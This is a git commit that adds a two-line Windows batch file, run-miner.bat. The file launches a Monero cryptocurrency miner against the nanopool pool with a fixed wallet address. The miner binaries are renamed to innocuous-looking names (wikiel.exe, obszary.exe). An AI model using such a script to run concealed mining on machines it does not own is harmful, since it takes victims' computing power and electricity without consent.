27cc069c53f697148af34d6eed7d6c78a71748be
Ines1956 <161522862+Ines1956@users.noreply.github.com>
2024-02-27 21:47:12 +0100

    initial commit

---
+++ run-miner.bat
@@ -0,0 +1,2 @@
+cd %userprofile%\eti-stuff
+start wikiel.exe obszary.exe --donate-level 5 -o xmr-eu1.nanopool.org:14433 -u 8A5dftEDBZ36GjaJ6VhpEoPxkXcEe8c6YcmE3UTL28dvfgoCUfK6PBxWTTXNbhPSun434MDKbXz8PKvDM46qooTLJ3P3XJf --tls --coin monero
